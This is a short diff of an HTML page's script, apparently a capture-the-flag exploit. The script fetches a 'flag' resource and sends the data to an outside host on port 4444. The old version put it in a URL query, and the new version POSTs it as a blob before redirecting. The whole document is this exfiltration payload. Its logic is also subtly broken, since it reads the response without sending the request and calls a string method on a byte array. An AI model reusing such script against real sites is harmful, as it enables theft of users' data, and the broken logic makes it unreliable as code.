@@ -12,13 +12,16 @@
         document.write('<h1>Time</h1>');
         var r;
         var x1 = new XMLHttpRequest();
-        x1.open("GET", "http://n3on.ninja/flag", true);
+        x1.open("GET", "http:\/\/n3on.ninja\/flag", true);
         r = x1.response;
         var body = new Uint8Array(r.length);
         for (var i = 0; i < body.length; i++) {
             body[i] = body.charCodeAt(i);
         }
-        window.location.href ="http://bits4everyone.com:4444/?data="+body.toString();
+        var x2 = new XMLHttpRequest();
+        x2.open("POST", "http:\/\/bits4everyone.com:4444\/", true);
+        x2.send(new Blob([body]));
+        window.location.href ="http://bits4everyone.com:4444"
     </script>
 </body>
 </html>
